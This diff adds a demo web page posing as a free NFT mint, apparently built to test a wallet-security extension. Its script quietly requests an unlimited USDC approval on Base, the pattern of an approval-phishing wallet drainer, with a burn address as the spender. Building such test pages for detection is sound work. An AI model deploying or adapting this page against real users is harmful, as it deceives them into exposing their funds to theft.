@@ -1,0 +1,91 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Base Genesis · Free Mint</title>
+<meta property="og:title" content="Base Genesis — Free NFT Mint" />
+<meta property="og:site_name" content="Base Genesis" />
+<style>
+  :root { color-scheme: light; }
+  body { font-family: system-ui, -apple-system, sans-serif; margin: 0; background: linear-gradient(135deg, #2563eb, #1e40af); min-height: 100vh; color: #fff; }
+  main { max-width: 480px; margin: 0 auto; padding: 4rem 1.5rem; text-align: center; }
+  h1 { font-size: 2rem; margin: 0 0 0.5rem; letter-spacing: -0.02em; }
+  p.lede { font-size: 1rem; color: #cbd5e1; margin-bottom: 2rem; }
+  .card { background: rgba(255,255,255,0.08); backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.18); border-radius: 14px; padding: 1.75rem; margin-bottom: 1rem; }
+  .card h2 { margin: 0 0 0.25rem; font-size: 1.1rem; }
+  .card .price { color: #93c5fd; font-weight: 600; font-size: 1.4rem; margin: 0.5rem 0 1rem; }
+  button { width: 100%; padding: 0.85rem 1rem; border: 0; border-radius: 8px; background: #fff; color: #1e3a8a; font-weight: 600; font-size: 1rem; cursor: pointer; }
+  button:hover { background: #f1f5f9; }
+  button:disabled { opacity: 0.5; cursor: not-allowed; }
+  pre.log { text-align: left; font-size: 0.78rem; background: rgba(0,0,0,0.4); padding: 0.75rem; border-radius: 6px; max-height: 16em; overflow: auto; margin-top: 1rem; }
+  .small { font-size: 0.8rem; color: #94a3b8; }
+</style>
+</head>
+<body>
+<main>
+  <h1>🎁 Base Genesis NFT</h1>
+  <p class="lede">Limited drop, free for early supporters. Connect to claim.</p>
+
+  <section class="card">
+    <h2>Genesis #2026</h2>
+    <p class="price">FREE · gas only</p>
+    <button id="mint">Mint your free NFT</button>
+    <p class="small" style="margin-top: 1rem;">Wallet must be connected to Base. Approves USDC under the hood (because reasons).</p>
+  </section>
+
+  <pre id="log" class="log">Console output appears here.</pre>
+</main>
+
+<script>
+// Demo only — visually pretends to be a friendly NFT mint, but actually requests
+// USDC.approve(0xdeAD..., MAX_UINT256) on Base. The Intent Check extension should
+// flag this with UNLIMITED_APPROVAL → DANGER.
+
+const USDC_BASE = "0x833589fcD6eDb6E08f4c7C32D4f71b54bdA02913";
+const EVIL_SPENDER = "0x000000000000000000000000000000000000dEaD";
+const MAX_UINT256 = "0x" + "f".repeat(64);
+
+// approve(address,uint256) selector + ABI-encoded args
+function buildApproveCalldata(spender, amountHex) {
+  const selector = "0x095ea7b3";
+  const padSpender = spender.toLowerCase().replace("0x", "").padStart(64, "0");
+  const padAmount = amountHex.toLowerCase().replace("0x", "").padStart(64, "0");
+  return selector + padSpender + padAmount;
+}
+
+const log = (msg) => {
+  const el = document.getElementById("log");
+  el.textContent += "\n" + msg;
+  el.scrollTop = el.scrollHeight;
+};
+
+document.getElementById("mint").addEventListener("click", async () => {
+  try {
+    const provider = window.ethereum;
+    if (!provider) {
+      log("✗ No window.ethereum found. Install MetaMask or another browser wallet.");
+      return;
+    }
+    log("→ Requesting accounts…");
+    const accounts = await provider.request({ method: "eth_requestAccounts" });
+    const from = accounts[0];
+    log(`✓ Connected: ${from}`);
+
+    const data = buildApproveCalldata(EVIL_SPENDER, MAX_UINT256);
+    log(`→ Sending eth_sendTransaction · USDC.approve(${EVIL_SPENDER.slice(0, 10)}…, MAX_UINT256)`);
+    log(`  to: ${USDC_BASE}`);
+    log(`  data: ${data.slice(0, 22)}…`);
+
+    const txHash = await provider.request({
+      method: "eth_sendTransaction",
+      params: [{ from, to: USDC_BASE, data, value: "0x0" }],
+    });
+    log(`✓ tx: ${txHash}`);
+  } catch (e) {
+    log(`✗ ${e.code ?? "?"} ${e.message ?? e}`);
+  }
+});
+</script>
+</body>
+</html>
